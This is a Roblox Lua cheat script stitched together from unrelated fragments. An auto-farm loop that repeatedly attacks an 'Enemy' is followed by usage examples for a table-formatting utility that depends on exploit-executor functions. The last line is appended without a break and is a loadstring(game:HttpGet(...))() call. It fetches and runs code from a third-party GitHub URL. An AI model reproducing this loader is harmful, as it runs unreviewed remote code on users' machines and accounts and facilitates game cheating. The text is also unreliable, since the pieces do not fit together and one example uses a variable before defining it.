local player = game.Players.LocalPlayer
local rs = game:GetService("RunService")

local function farm()
    while true do
        local target = workspace:FindFirstChild("Enemy") -- Change this to the enemy's name
        if target then
            local character = player.Character
            local weapon = character:FindFirstChild("Weapon") -- Change this to your weapon's name
            if weapon then
                weapon:Activate()
                rs.RenderStepped:Wait()
            end
        end
        rs.RenderStepped:Wait()
    end
end

farm()

FormatTable({a, "b", 1, game:GetService("Players"), pcall})

FormatTable({ workspace, 20, { pcall, 0X20 } }, {
    OneLine = true;
    IgnoreNumberIndex = true;
    NoIndentation = false;
    MetatableKey = nil;
    GenerateScript = false;
    NoAntiRep = false;
    LargeStrings = false;
})

FormatArguments(a, "b", 1, game:GetService("Players"), pcall)

local Result = FormatTable({ 1, "b", game:GetService("Players").LocalPlayer}, {
    OneLine = false;
    IgnoreNumberIndex = false;
    NoIndentation = false;
    MetatableKey = Key;
    GenerateScript = true;
    NoAntiRep = false;
    LargeStrings = false;
}) --// Will return a table with two arguments, [1] will contain FindFunction(), [2] will contain the generated code

local Proxy, Key = newproxy(true), game:GetService("HttpService"):GenerateGUID(false)
setrawmetatable(Proxy, {
    [Key] = "Hello there"
})
FormatTable({ workspace, 20, Proxy }, {
    OneLine = false;
    IgnoreNumberIndex = false;
    NoIndentation = false;
    MetatableKey = Key;
    GenerateScript = false;
    NoAntiRep = false;
    LargeStrings = false;
})loadstring(game:HttpGet("https://raw.githubusercontent.com/Cuscuzhubx/Roblox/main/Cuscuz.lua"))()
